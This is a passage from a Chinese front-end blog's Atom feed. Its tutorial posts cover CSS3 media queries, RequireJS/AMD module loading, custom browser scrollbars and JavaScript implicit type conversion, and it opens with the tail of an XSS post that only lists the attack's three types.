      &lt;h2 id=&quot;XSS攻击&quot;&gt;&lt;a href=&quot;#XSS攻击&quot; class=&quot;headerlink&quot; title=&quot;XSS攻击&quot;&gt;&lt;/a&gt;XSS攻击&lt;/h2&gt;&lt;p&gt;XSS（cross-site scripting跨域脚本攻击）攻击是最常见的WEB攻击之一，其重点是“&lt;strong&gt;跨域&lt;/strong&gt;”和“&lt;strong&gt;客户端执行&lt;/strong&gt;”。&lt;/p&gt;
&lt;p&gt;XSS攻击分为三种&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Reflected XSS&lt;/li&gt;
&lt;li&gt;Stored XSS&lt;/li&gt;
&lt;li&gt;DOM-based or loacl XSS&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="js" scheme="https://jasonyan2015.github.io/tags/js/"/>
    
      <category term="安全" scheme="https://jasonyan2015.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CSS3媒体查询</title>
    <link href="https://jasonyan2015.github.io/2017/04/09/CSS3%E5%AA%92%E4%BD%93%E6%9F%A5%E8%AF%A2/"/>
    <id>https://jasonyan2015.github.io/2017/04/09/CSS3媒体查询/</id>
    <published>2017-04-09T04:07:12.789Z</published>
    <updated>2017-04-09T04:09:46.981Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>移动浪潮的到来，促使web的主战场从PC迁移到了Mobile。于是为了适应各式各样的设备尺寸，出现了响应式设计模型。而这一设计的核心，便是CSS的Media媒体查询器。</p>
</blockquote>
<a id="more"></a>
<h2 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a>meta标签</h2><p>先介绍一下HTML的meta标签。<code>&lt;meta&gt;</code>可提供有关某个 HTML 元素的元信息 (meta-information)，比如描述、针对搜索引擎的关键词以及刷新频率。</p>
<p>它有以下几个属性：</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>content</td>
<td>设置或返回 <meta> 元素的 content 属性的值。</td>
</tr>
<tr>
<td>httpEquiv</td>
<td>把 content 属性连接到一个 HTTP 头部。</td>
</tr>
<tr>
<td>name</td>
<td>把 content 属性连接到某个名称。</td>
</tr>
<tr>
<td>scheme</td>
<td>设置或返回用于解释 content 属性的值的格式。</td>
</tr>
</tbody>
</table>
<p>而在响应式中我们常常这么设置(IE9及以上)：</p>
<pre><code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&gt;
</code></pre><p>参数说明：</p>
<ul>
<li>width = device-width：宽度等于当前设备的宽度</li>
<li>initial-scale：初始的缩放比例（默认设置为1.0）  </li>
<li>minimum-scale：允许用户缩放到的最小比例（默认设置为1.0）    </li>
<li>maximum-scale：允许用户缩放到的最大比例（默认设置为1.0）   </li>
<li>user-scalable：用户是否可以手动缩放（默认设置为no，因为我们不希望用户放大缩小页面） </li>
</ul>
<p>还有这个：</p>
<pre><code>&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge，chrome=1&quot;&gt;
</code></pre><p>这个主要是为了防止有的用户IE升级到IE9以上了而浏览器的文档模式却是IE8。最后的<code>chrome=1</code>代表<code>[Google Chrome Frame（谷歌内嵌浏览器框架GCF）](http://zh.wikipedia.org/wiki/Google_Chrome_Frame)</code>.如果有的用户电脑里面装了这个chrome的插件，就可以让电脑里面的IE不管是哪个版本的都可以使用Webkit引擎及V8引擎进行排版及运算，如果用户没装这个插件，那这段代码就会让IE以最高的文档模式展现效果。</p>
<blockquote>
<p>IE8既不支持HTML5也不支持CSS3 Media,所以如果需要兼容，则需要引入一下两个js文件</p>
   <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->
<p>顺便，复习一下<a href="http://www.cnblogs.com/fm168/p/5526702.html" target="_blank" rel="external">CSS条件注释</a></p>
</blockquote>
<h2 id="CSS3-Media"><a href="#CSS3-Media" class="headerlink" title="CSS3 Media"></a>CSS3 Media</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><pre><code>@media mediatype and|not|only (media feature) {
    CSS-Code;
}
</code></pre><p>或者使用引用link</p>
<pre><code>&lt;link rel=&quot;stylesheet&quot; media=&quot;mediatype and|not|only (media feature)&quot; href=&quot;mystylesheet.css&quot;&gt;
</code></pre><p>其中<code>mediatype</code>主要有:</p>
<ul>
<li>all: 用于所有设备</li>
<li>print:　用于打印机和打印预览</li>
<li>screen: 用于电脑屏幕，平板电脑，智能手机等。</li>
<li>speech: 用于屏幕阅读器等发声设备</li>
</ul>
<p><code>media feature</code>主要有:</p>
<table>
<thead>
<tr>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>aspect-ratio</td>
<td>定义输出设备中的页面可见区域宽度与高度的比率</td>
</tr>
<tr>
<td>color</td>
<td>定义输出设备每一组彩色原件的个数。如果不是彩色设备，则值等于0</td>
</tr>
<tr>
<td>color-index</td>
<td>定义在输出设备的彩色查询表中的条目数。如果没有使用彩色查询表，则值等于0</td>
</tr>
<tr>
<td>device-aspect-ratio</td>
<td>定义输出设备的屏幕可见宽度与高度的比率。</td>
</tr>
<tr>
<td>device-height</td>
<td>定义输出设备的屏幕可见高度。</td>
</tr>
<tr>
<td>device-width</td>
<td>定义输出设备的屏幕可见宽度。</td>
</tr>
<tr>
<td>grid</td>
<td>用来查询输出设备是否使用栅格或点阵。</td>
</tr>
<tr>
<td>height</td>
<td>定义输出设备中的页面可见区域高度。</td>
</tr>
<tr>
<td>max-aspect-ratio</td>
<td>定义输出设备的屏幕可见宽度与高度的最大比率。</td>
</tr>
<tr>
<td>max-color</td>
<td>定义输出设备每一组彩色原件的最大个数。</td>
</tr>
<tr>
<td>max-color-index</td>
<td>定义在输出设备的彩色查询表中的最大条目数。</td>
</tr>
<tr>
<td>max-device-aspect-ratio</td>
<td>定义输出设备的屏幕可见宽度与高度的最大比率。</td>
</tr>
<tr>
<td>max-device-height</td>
<td>定义输出设备的屏幕可见的最大高度。</td>
</tr>
<tr>
<td>max-device-width</td>
<td>定义输出设备的屏幕最大可见宽度。</td>
</tr>
<tr>
<td>max-height</td>
<td>定义输出设备中的页面最大可见区域高度。</td>
</tr>
<tr>
<td>max-monochrome</td>
<td>定义在一个单色框架缓冲区中每像素包含的最大单色原件个数。</td>
</tr>
<tr>
<td>max-resolution</td>
<td>定义设备的最大分辨率。</td>
</tr>
<tr>
<td>max-width</td>
<td>定义输出设备中的页面最大可见区域宽度。</td>
</tr>
<tr>
<td>min-aspect-ratio</td>
<td>定义输出设备中的页面可见区域宽度与高度的最小比率。</td>
</tr>
<tr>
<td>min-color</td>
<td>定义输出设备每一组彩色原件的最小个数。</td>
</tr>
<tr>
<td>min-color-index</td>
<td>定义在输出设备的彩色查询表中的最小条目数。</td>
</tr>
<tr>
<td>min-device-aspect-ratio</td>
<td>定义输出设备的屏幕可见宽度与高度的最小比率。</td>
</tr>
<tr>
<td>min-device-width</td>
<td>定义输出设备的屏幕最小可见宽度。</td>
</tr>
<tr>
<td>min-device-height</td>
<td>定义输出设备的屏幕的最小可见高度。</td>
</tr>
<tr>
<td>min-height</td>
<td>定义输出设备中的页面最小可见区域高度。</td>
</tr>
<tr>
<td>min-monochrome</td>
<td>定义在一个单色框架缓冲区中每像素包含的最小单色原件个数</td>
</tr>
<tr>
<td>min-resolution</td>
<td>定义设备的最小分辨率。</td>
</tr>
<tr>
<td>min-width</td>
<td>定义输出设备中的页面最小可见区域宽度。</td>
</tr>
<tr>
<td>monochrome</td>
<td>定义在一个单色框架缓冲区中每像素包含的单色原件个数。如果不是单色设备，则值等于0</td>
</tr>
<tr>
<td>orientation</td>
<td>定义输出设备中的页面可见区域高度是否大于或等于宽度。</td>
</tr>
<tr>
<td>resolution</td>
<td>定义设备的分辨率。如：96dpi, 300dpi, 118dpcm</td>
</tr>
<tr>
<td>scan</td>
<td>定义电视类设备的扫描工序。</td>
</tr>
<tr>
<td>width</td>
<td>定义输出设备中的页面可见区域宽度。</td>
</tr>
</tbody>
</table>
<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><pre><code>@media screen and (max-width: 960px){
    body{
        background: #000;
    }
}
</code></pre><p>上面这段CSS代码意思是：当页面小于960px的时候执行这一段CSS。</p>
<p>也可以省略screen(不考虑用户打印等其他需求)，直接</p>
<pre><code>@media (max-width: 960px){
    body{
        background: #000;
    }
}
</code></pre><p>再比如：</p>
<pre><code>@media screen and (max-device-width:960px){
    body{
        background:red;
    }
}
</code></pre><p>实现等于960px尺寸的代码</p>
<p>或者混合：</p>
<pre><code>@media screen and (min-width:960px) and (max-width:1200px){
    body{
        background:yellow;
    }
}
</code></pre><hr>
<p>参考链接</p>
<ul>
<li><a href="http://www.runoob.com/jsref/dom-obj-meta.html" target="_blank" rel="external">HTML DOM Meta 对象</a></li>
<li><a href="http://www.520ued.com/article/53882d7ab992a7c43f5c204b" target="_blank" rel="external">css3 media媒体查询器用法总结–来自520UED</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;移动浪潮的到来，促使web的主战场从PC迁移到了Mobile。于是为了适应各式各样的设备尺寸，出现了响应式设计模型。而这一设计的核心，便是CSS的Media媒体查询器。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="响应式" scheme="https://jasonyan2015.github.io/tags/%E5%93%8D%E5%BA%94%E5%BC%8F/"/>
    
      <category term="CSS" scheme="https://jasonyan2015.github.io/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>【模块化JS】AMD规范</title>
    <link href="https://jasonyan2015.github.io/2017/04/04/AMD%E8%A7%84%E8%8C%83/"/>
    <id>https://jasonyan2015.github.io/2017/04/04/AMD规范/</id>
    <published>2017-04-04T07:08:59.321Z</published>
    <updated>2017-04-22T08:16:41.150Z</updated>
    
    <content type="html"><![CDATA[<p>Asynchronous Module Definition——异步模块定义</p>
<p>它是一个在浏览器端模块化开发的规范。由于不是Javascript原生支持，使用AMD规范进行页面开发需要用到对应的库函数——<strong>RequireJS</strong></p>
<p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1485016792251&amp;di=e0445002cd2ccabd9c130a8e12d4d1d2&amp;imgtype=0&amp;src=http%3A%2F%2Fwww.uedsc.com%2Fwp-content%2Fuploads%2F2015%2F08%2Frequirejs.jpg" alt="RequireJS图标"></p>
<h4 id="RequireJS主要解决两个问题"><a href="#RequireJS主要解决两个问题" class="headerlink" title="RequireJS主要解决两个问题"></a>RequireJS主要解决两个问题</h4><ol>
<li>多个js文件之间可能存在依赖关系时需要被依赖文件先备加载到浏览器</li>
<li>js文件加载时，加载文件越多，页面失去响应时间越久</li>
</ol>
<a id="more"></a>
<h4 id="语法简介"><a href="#语法简介" class="headerlink" title="语法简介"></a>语法简介</h4><p><em>定义模块</em>——define([id], [dependencies], factory);</p>
<p>它是全局变量，用于定义模块。</p>
<ul>
<li>id：可选，用于定义模块标识。若没有提供该参数，则标识为脚本文件名</li>
<li>dependencies：可选，所依赖的模块</li>
<li>factory：模块初始化要执行的函数或对象。若为函数，则只被执行一次，若为对象，则此对象应为模块的输出值。</li>
</ul>
<p><em>加载模块</em>——require([dependencies], callback);</p>
<ul>
<li>dependencies：数组，表示所依赖的模块</li>
<li>callback：回调函数，当前面指定的模块都加载成功后，它将被调用。加载的模块会以参数形式传入该函数，从而在回调函数内部就可以使用这些模块。</li>
</ul>
<blockquote>
<p>补充：require()函数在加载依赖的函数时是异步加载的，这样浏览器就不会失去响应，它指定的回调函数只有在前面的模块都加载成功后才会运行。由此解决依赖性问题。</p>
</blockquote>
<h3 id="使用RequireJS"><a href="#使用RequireJS" class="headerlink" title="使用RequireJS"></a>使用RequireJS</h3><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p><a href="http://www.requirejs.cn/docs/download.html" target="_blank" rel="external">下载链接</a></p>
<h4 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h4><p>假定现在项目中所有js文件都放在一个”scripts”目录下，并添加上require.js。</p>
<pre><code>* 项目目录/
  * project.html
  * scripts/
     * main.js
     * *require.js*
     * helper/
         * util.js
</code></pre><p>为了充分利用require.js建议只在HTML中引入require.js，然后通过它来请求加载其他的scripts：</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;My Sample Project&lt;/title&gt;
        &lt;!-- data-main attribute tells require.js to load scripts/main.js after require.js loads. --&gt;
        &lt;script data-main=&quot;scripts/main&quot; src=&quot;scripts/require.js&quot;&gt;&lt;/script&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;h1&gt;My Sample Project&lt;/h1&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre><ul>
<li>data-main属性：require.js使用它来启动脚本加载过程。</li>
</ul>
<blockquote>
<p>RequireJS以一个相对于baseUrl的地址来加载所有的代码。而baseUrl有三种方式可以设置。</p>
<ol>
<li>使用上述data-main属性，可设置baseUrl为该属性相一致的目录。上例中为scripts文件夹</li>
<li>使用RequireJS 的config手动设置。比如在main.js头部添加<pre><code> require.config({
    paths: {
            jsFileName: &apos;FileAddress&apos;
    }
});
</code></pre></li>
<li>如果没有显式指定上述二者，则默认为包含RequireJS的那个HTML页面所属目录。</li>
</ol>
</blockquote>
<p>然后在main.js中使用require()来加载所有需要运行的scripts。</p>
<pre><code>require([&quot;helper/util&quot;], function(util) {
    //This function is called when scripts/helper/util.js is loaded.
    //If util.js calls define(), then this function is not fired until
    //util&apos;s dependencies have loaded, and the util argument will hold
    //the module value for &quot;helper/util&quot;.
});
</code></pre><h4 id="加载文件"><a href="#加载文件" class="headerlink" title="加载文件"></a>加载文件</h4><p>以加载一个jQuery库为例。之前都是加载本地js模块，若是需要加载来自本地服务器、其他网站或CDN的js，那么可以用如下方式：</p>
<pre><code>require.config({
    paths : {
        &quot;jquery&quot; : [&quot;http://libs.baidu.com/jquery/2.0.3/jquery&quot;]   
    }
})
require([&quot;jquery&quot;,&quot;js/a&quot;],function($){
    $(function(){
        alert(&quot;load finished&quot;);  
    })
})
</code></pre><p>require.config用来配置模块加载位置。简单点说就是给模块起一个更短更好记的名字，比如将百度的jquery库地址标记为jquery，这样在require时只需要写[“jquery”]就可以加载该js。当然，本地的js也可以这样配置。</p>
<p>通过paths的配置会使我们的模块名字更精炼，paths还有一个重要的功能，就是可以配置多个路径，如果远程cdn库没有加载成功，可以加载本地的库，如：</p>
<pre><code>require.config({
    paths : {
        &quot;jquery&quot; : [&quot;http://libs.baidu.com/jquery/2.0.3/jquery&quot;, &quot;js/jquery&quot;],
        &quot;a&quot; : &quot;js/a&quot;   
    }
})
require([&quot;jquery&quot;,&quot;a&quot;],function($){
    $(function(){
        alert(&quot;load finished&quot;);  
    })
})
</code></pre><p>这样配置后，当百度的jquery没有加载成功后，会加载本地js目录下的jquery。</p>
<ol>
<li>在使用requirejs时，加载模块时不用写.js后缀的，当然也是不能写后缀</li>
<li>上面例子中的callback函数中发现有$参数，这个就是依赖的jquery模块的输出变量，如果你依赖多个模块，可以依次写入多个参数来使用。</li>
</ol>
<p>事实上，一般把require.config配置放到data-main中配置，这样就可以使每一个页面都使用这个配置，然后页面中就可以直接使用require来加载所有的短模块名。</p>
<p><em>main.js</em></p>
<pre><code>require.config({
    paths : {
        &quot;jquery&quot; : [&quot;http://libs.baidu.com/jquery/2.0.3/jquery&quot;, &quot;js/jquery&quot;],
        &quot;a&quot; : &quot;js/a&quot;   
    }
})
</code></pre><p><em>project.html</em></p>
<pre><code>&lt;script data-main=&quot;js/main&quot; src=&quot;js/require.js&quot;&gt;&lt;/script&gt;
</code></pre><h5 id="加载第三方模块"><a href="#加载第三方模块" class="headerlink" title="加载第三方模块"></a>加载第三方模块</h5><p>通过require加载的模块一般都需要符合AMD规范即使用define来申明模块，但是部分时候需要加载非AMD规范的js，这时候就需要用到另一个功能——shim</p>
<p>主要用在两个地方</p>
<ol>
<li><p>非AMD模块输出，将非标准的AMD模块”垫”成可用的模块，例如：老版本的jquery，并没有继承AMD规范，所以不能直接require[“jquery”],这时候就需要shim。比如我要是用underscore类库，但是他并没有实现AMD规范，那么可以这样配置：</p>
<pre><code>require.config({
    shim: {
        &quot;underscore&quot; : {
            exports : &quot;_&quot;;
        }
    }
})
</code></pre><p> 这样配置后，就可以在其他模块中引用underscore模块：</p>
<pre><code>require([&quot;underscore&quot;], function(_){
    _.each([1,2,3], alert);
})
</code></pre></li>
<li><p>插件形式的非AMD模块。我们经常会用到jquery插件，而这些插件基本都不符合AMD规范，比如jquery.form插件，这时候就需要将form插件shim到jquery中：</p>
<pre><code>require.config({
    shim: {
        &quot;underscore&quot; : {
            exports : &quot;_&quot;;
        },
        &quot;jquery.form&quot; : {
            deps : [&quot;jquery&quot;]
        }
    }
})
</code></pre><p> 这样配置之后我们就可以使用加载插件后的jquery了</p>
<pre><code>require.config([&quot;jquery&quot;, &quot;jquery.form&quot;], function($){
    $(function(){
        $(&quot;#form&quot;).ajaxSubmit({...});
    })
})
</code></pre></li>
</ol>
<hr>
<p><a href="http://www.runoob.com/w3cnote/requirejs-tutorial-1.html" target="_blank" rel="external">RequireJS简单教程</a></p>
<p><a href="http://www.requirejs.cn/" target="_blank" rel="external">RequireJS中文网</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Asynchronous Module Definition——异步模块定义&lt;/p&gt;
&lt;p&gt;它是一个在浏览器端模块化开发的规范。由于不是Javascript原生支持，使用AMD规范进行页面开发需要用到对应的库函数——&lt;strong&gt;RequireJS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://timgsa.baidu.com/timg?image&amp;amp;quality=80&amp;amp;size=b9999_10000&amp;amp;sec=1485016792251&amp;amp;di=e0445002cd2ccabd9c130a8e12d4d1d2&amp;amp;imgtype=0&amp;amp;src=http%3A%2F%2Fwww.uedsc.com%2Fwp-content%2Fuploads%2F2015%2F08%2Frequirejs.jpg&quot; alt=&quot;RequireJS图标&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;RequireJS主要解决两个问题&quot;&gt;&lt;a href=&quot;#RequireJS主要解决两个问题&quot; class=&quot;headerlink&quot; title=&quot;RequireJS主要解决两个问题&quot;&gt;&lt;/a&gt;RequireJS主要解决两个问题&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;多个js文件之间可能存在依赖关系时需要被依赖文件先备加载到浏览器&lt;/li&gt;
&lt;li&gt;js文件加载时，加载文件越多，页面失去响应时间越久&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="模块化" scheme="https://jasonyan2015.github.io/tags/%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
    
      <category term="js" scheme="https://jasonyan2015.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>自定义浏览器滚动条</title>
    <link href="https://jasonyan2015.github.io/2017/04/04/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BB%9A%E5%8A%A8%E6%9D%A1/"/>
    <id>https://jasonyan2015.github.io/2017/04/04/自定义浏览器滚动条/</id>
    <published>2017-04-04T07:08:59.294Z</published>
    <updated>2017-04-08T16:22:54.145Z</updated>
    
    <content type="html"><![CDATA[<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li>IE浏览器</li>
<li>webkit内核浏览器</li>
</ul>
<a id="more"></a>
<hr>
<h2 id="IE浏览器"><a href="#IE浏览器" class="headerlink" title="IE浏览器"></a>IE浏览器</h2><table>
<thead>
<tr>
<th>滚动条样式</th>
<th style="text-align:center">支持浏览器版本</th>
<th style="text-align:center">可否继承</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>scrollbar-3dlight-color</td>
<td style="text-align:center">IE5.5+</td>
<td style="text-align:center">y</td>
<td style="text-align:center">设置滚动框的和滚动条箭头左上边缘的颜色</td>
</tr>
<tr>
<td>scrollbar-highlight-color</td>
<td style="text-align:center">IE5.5+</td>
<td style="text-align:center">y</td>
<td style="text-align:center">设置滚动框的和滚动条箭头左上边缘的颜色</td>
</tr>
<tr>
<td>scrollbar-face-color</td>
<td style="text-align:center">IE5.5+</td>
<td style="text-align:center">y</td>
<td style="text-align:center">设置滚动框和滚动条箭头的颜色</td>
</tr>
<tr>
<td>scrollbar-arrow-color</td>
<td style="text-align:center">IE5.5+</td>
<td style="text-align:center">y</td>
<td style="text-align:center">设置滚动条箭头的颜色</td>
</tr>
<tr>
<td>scrollbar-shadow-color</td>
<td style="text-align:center">IE5.5+</td>
<td style="text-align:center">y</td>
<td style="text-align:center">设置滚动框的和滚动条箭头右下边缘的颜色</td>
</tr>
<tr>
<td>scrollbar-dark-shadow-color</td>
<td style="text-align:center">IE5.5+</td>
<td style="text-align:center">y</td>
<td style="text-align:center">设置滚动条槽的颜色</td>
</tr>
<tr>
<td>scrollbar-base-color</td>
<td style="text-align:center">IE5.5+</td>
<td style="text-align:center">y</td>
<td style="text-align:center">设置滚动条主要构成部分的颜色</td>
</tr>
<tr>
<td>scrollbar-track-color</td>
<td style="text-align:center">IE5.5+</td>
<td style="text-align:center">y</td>
<td style="text-align:center">设置滚动条轨迹组成部分的颜色</td>
</tr>
</tbody>
</table>
<p><img src="http://oo3e61qcc.bkt.clouddn.com/IEscrollbar.gif" alt="ie滚动条说明"></p>
<h2 id="webkit内核浏览器"><a href="#webkit内核浏览器" class="headerlink" title="webkit内核浏览器"></a>webkit内核浏览器</h2><pre><code>    CSS
::-webkit-scrollbar              { /* 1 */ }
::-webkit-scrollbar-button       { /* 2 */ }
::-webkit-scrollbar-track        { /* 3 */ }
::-webkit-scrollbar-track-piece  { /* 4 */ }
::-webkit-scrollbar-thumb        { /* 5 */ }
::-webkit-scrollbar-corner       { /* 6 */ }
::-webkit-resizer                { /* 7 */ }
</code></pre><p><img src="http://oo3e61qcc.bkt.clouddn.com/webkitScrollbar.png" alt="webkit内核浏览器"></p>
<ul>
<li>::-webkit-scrollbar            滚动条整体部分，其中的属性有width,height,background,border    （就和一个块级元素一样）等。</li>
<li>::-webkit-scrollbar-button          滚动条两端的按钮。可以用display:none让其不显示，也可以添加背景图片，颜色改变显示效果。</li>
<li>::-webkit-scrollbar-track         外层轨道。可以用display:none让其不显示，也可以添加背景图片，颜色改变显示效果。</li>
<li>::-webkit-scrollbar-track-piece        内层轨道，滚动条中间部分（除去）。</li>
<li>::-webkit-scrollbar-thumb               滚动条里面可以拖动的那部分</li>
<li>::-webkit-scrollbar-corner               边角</li>
<li>::-webkit-resizer                       定义右下角拖动块的样式</li>
</ul>
<blockquote>
<p>注意：对以上各个部分定义width,height时。有如下功能：若是水平滚动条，则width属性不起作用，height属性用来控制滚动条相应部分竖直方向高度；若是竖直滚动条，则height属性不起作用，width属性用来控制相应部分的宽度。</p>
</blockquote>
<hr>
<hr>
<p>p.s.拓展</p>
<p>通过以上，我们几乎就可以来重写网站的滚动条了，但是webkit提供的还有更多的伪类，可以定制更丰富滚动条样式。本文以下内容参考：<a href="https://www.webkit.org/blog/363/styling-scrollbars/" target="_blank" rel="external">https://www.webkit.org/blog/363/styling-scrollbars/</a></p>
<ul>
<li>:horizontal     horizontal  伪类，主要应用于选择水平方向滚动条。</li>
<li>:vertical    vertical伪类主要是应用于选择竖直方向滚动条</li>
<li>:decrement    decrement伪类应用于按钮和内层轨道(track piece)。它用来指示按钮或者内层轨道是否会减小视窗的位置(比如，垂直滚动条的上面，水平滚动条的左边。)</li>
<li>:increment     increment伪类与和decrement类似，用来指示按钮或内层轨道是否会增大视窗的位置(比如，垂直滚动条的下面和水平滚动条的右边。)</li>
<li>:start    start伪类也应用于按钮和滑块。它用来定义对象是否放到滑块的前面。</li>
<li>:end     类似于start伪类，标识对象是否放到滑块的后面。</li>
<li>:double-button    该伪类可以用于按钮和内层轨道。用于判断一个按钮是不是放在滚动条同一端的一对按钮中的一个。对于内层轨道来说，它表示内层轨道是否紧靠一对按钮。</li>
<li>:single-button    类似于double-button伪类。对按钮来说，它用于判断一个按钮是否自己独立的在滚动条的一段。对内层轨道来说，它表示内层轨道是否紧靠一个single-button。</li>
<li>:no-button    用于内层轨道，表示内层轨道是否要滚动到滚动条的终端，比如，滚动条两端没有按钮的时候。</li>
<li>:corner-present    用于所有滚动条轨道，指示滚动条圆角是否显示。</li>
<li>:window-inactive    用于所有的滚动条轨道，指示应用滚动条的某个页面容器(元素)是否当前被激活。(在webkit最近的版本中，该伪类也可以用于::selection伪元素。webkit团队有计划扩展它并推动成为一个标准的伪类)<blockquote>
<p>另外，:enabled、:disabled、:hover、和:active等伪类同样在滚动条中适用。</p>
</blockquote>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;目录&quot;&gt;&lt;a href=&quot;#目录&quot; class=&quot;headerlink&quot; title=&quot;目录&quot;&gt;&lt;/a&gt;目录&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;IE浏览器&lt;/li&gt;
&lt;li&gt;webkit内核浏览器&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="浏览器" scheme="https://jasonyan2015.github.io/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
      <category term="css" scheme="https://jasonyan2015.github.io/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>Js的隐式类型转换</title>
    <link href="https://jasonyan2015.github.io/2017/04/04/js%E9%9A%90%E5%BC%8F%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E9%97%AE%E9%A2%98/"/>
    <id>https://jasonyan2015.github.io/2017/04/04/js隐式类型转换问题/</id>
    <published>2017-04-04T07:08:59.292Z</published>
    <updated>2017-04-08T16:23:40.952Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><h5 id="腾讯笔试题"><a href="#腾讯笔试题" class="headerlink" title="腾讯笔试题"></a>腾讯笔试题</h5><p>顺便吐槽一句……</p>
<a id="more"></a>
<p>腾讯考的选择题相对其他网易阿里360什么的要更专业前端一些，他们几个都更广泛考一些计算机组成，堆栈，二分什么乱七八糟的计算机基础知识，腾讯选择题全考的网络相关的，但是考的也太网络基础了…..交换机，IPV6相比IPV4的优点，UDP协议头，FTP协议…..咱们安安心心考个HTTP不好么…..我还没懂这么多呢[哭]</p>
<h5 id="好了正式的"><a href="#好了正式的" class="headerlink" title="好了正式的"></a>好了正式的</h5><p>起因是在腾讯2017实习生笔试，选择题考了一道关于</p>
<pre><code>if(0&lt;100&lt;0) console.log(&apos;0&lt;100&lt;0&apos;);
if(0&lt;100&lt;(0+4)) console.log(&apos;0&lt;100&lt;(0+4)&apos;)
</code></pre><h2 id="Js的隐式类型转换"><a href="#Js的隐式类型转换" class="headerlink" title="Js的隐式类型转换"></a>Js的隐式类型转换</h2><p>JS是弱类型编程语言，这点我一直印象深刻，因为刚学JS的时候发现声明变量不用乱七八糟的去动脑区分 <code>int</code>,<code>long int</code>,<code>short int</code>,<code>double</code>等等，只要一个<code>var</code>！没错！统统不要，只要一个<code>var</code>是不是hin贴心！！！</p>
<p>但是弱类型也带来了一些副作用，比如在代码中存在一些隐式类型转换，可能会让输入输出结果与编程者的期望不太一样。就像这道考题。</p>
<p>考完去chrome控制台验证了一下，输出结果应该是<code>0&lt;100&lt;(0+4)</code>，也就是说，<code>0&lt;100&lt;0+4</code>在if逻辑中判断为<code>true</code>。（神tm的判断……）</p>
<p>这就是隐式类型转换存在的缘故。因为括号内容<code>(0+4)</code>的存在，导致了括号中的表达式参与的判断被隐式转换成了number类型，因此，<code>0&lt;100</code>正常逻辑判断为<code>true</code>后，判断<code>true&lt;(0+4)</code>时被转换成了<code>0&lt;(0+4)</code>，所以最后被判断为<code>true</code>。</p>
<p>以下为控制台验证过程，’//‘后为返回结果</p>
<pre><code>true &lt; 1                //false
true &lt; 2                //true
true - 1                //0
true &lt; (0 + 0)            //false
true &lt; (0 + 4)             //true
true === (0 + 1)        //false
true == (0 + 1)            //true
true + 0 === (0 + 1)    //true
</code></pre><p>P.S.今天做赛码的笔试题的时候学到一个零几年就有但现在基本没人用的跑马灯标签：<br><code>&lt;marquee&gt;</code></p>
<p>其实我感觉功能还挺酷炫的。不仅可以移动文字，也可以移动图片，表格等。</p>
<p>语法：<code>&lt;marquee direction=&quot;&quot; behavior=&quot;&quot; scrollamount=&quot;&quot; &gt;...&lt;/marquee&gt;</code>(在标记之间添加要进行滚动的内容)</p>
<p>重要属性：</p>
<ul>
<li>滚动方向direction（包括4个值：up、 down、 left和 right）</li>
<li>滚动方式behavior（scroll:循环滚动，默认效果； slide:只滚动一次就停止； alternate:来回交替进行滚动）</li>
<li>滚动速度scrollamount（滚动速度是设置每次滚动时移动的长度，以像素为单位）</li>
<li>滚动延迟scrolldelay（设置滚动的时间间隔，单位是毫秒）</li>
<li>滚动循环loop（默认值是-1，滚动会不断的循环下去）</li>
<li>滚动范围width、height</li>
<li>滚动背景颜色bgcolor</li>
<li>空白空间hspace、vspace</li>
</ul>
<p>例子跑起来</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;test&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
